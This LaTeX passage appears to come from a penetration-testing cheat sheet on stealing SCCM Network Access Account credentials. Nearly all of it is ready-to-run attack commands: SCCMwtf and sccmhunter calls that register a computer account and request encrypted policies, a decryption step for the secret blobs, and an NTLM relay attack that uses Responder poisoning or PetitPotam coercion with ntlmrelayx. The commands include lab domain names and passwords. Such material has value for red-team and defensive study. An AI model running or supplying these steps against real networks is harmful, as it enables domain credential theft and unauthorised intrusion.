\section{Hunting Network Access account}

\subsection{Computer request}

A computer account has the ability to register itself with the SCCM server and request the encrypted NAA policies, decrypt them, de-obfuscate them and retrieve the NAA's credentials in them. A controlled computer account is needed to send the authenticated request, but the account to spoof doesn't need to be the same. \href{https://blog.xpnsec.com/unobfuscating-network-access-accounts/}{Full explains here}. 

this will create a computer un SCCM devices

\subsubsection{SCCMwtf}
using \href{https://github.com/xpn/sccmwtf}{SCCMwtf}
\begin{verbatim}
python sccmwtf.py \
    DESKTOP-2NHHIAVP \
    DESKTOP-2NHHIAVP.haas.local \
    'bran.haas.local' \
    'haas.local\DESKTOP-2NHHIAVP$' \
    'flg9lmKdwiJ8'
\end{verbatim}

Then decrypt the retrieved hexadecimal blobs:
\begin{verbatim}
grep CDATA naapolicy.xml
python3 policysecretunobfuscate.py <blob_hex_1>
python3 policysecretunobfuscate.py <blob_hex_2>
\end{verbatim}

\subsubsection{sccmhunter}
\begin{verbatim}
#Create a computer account and request the policies
python3 sccmhunter.py http -debug  -u <user> -p '<password>' -d <domain_fqdn> \
    -mp <sccm_fqdn> -dc-ip <dc_fqdn> -sleep 30 -auto

#To use an already controlled computer account
python3 sccmhunter.py http -debug  -u <user> -p '<password>' -d <domain_fqdn> \
    -mp <sccm_fqdn> -dc-ip <dc_fqdn> -sleep 30 -auto
\end{verbatim}

Then decrypt the retrieved hexadecimal blobs:
\begin{verbatim}
python3 policysecretunobfuscate.py <blob_hex_1>
python3 policysecretunobfuscate.py <blob_hex_2>
\end{verbatim}

\subsection{Relay attack}

code not yet merged to \verb+ntlmrelayx.py+ see \href{https://github.com/Tw1sm/impacket/tree/feature/sccm-relay}{sccm-relay}

with poisonning (responder):
\begin{verbatim}
nano Responder.conf (turn off smb and http)
responder -I eth0
\end{verbatim}

or coercion (petitpotam):
\begin{verbatim}
python3 PetitPotam.py -u lowpriv -p Jubeaz12345+- -d haas.local 192.168.2.3 architect.haas.local
\end{verbatim}


\begin{verbatim}
sudo ntlmrelayx.py -t http://bran.haas.local/ccm_system_windowsauth/request \
    --sccm \
    --sccm-device test1 \
    --sccm-fqdn bran.haas.local \
    --sccm-server bran \
    --sccm-sleep 10 \
    -smb2support
\end{verbatim}

To correct:
verb+PermissionError: [Errno 13] Permission denied: '/tmp/key.pem'+


Then decrypt the retrieved hexadecimal blobs:
\begin{verbatim}
python3 policysecretunobfuscate.py <blob_hex_1>
python3 policysecretunobfuscate.py <blob_hex_2>
\end{verbatim}
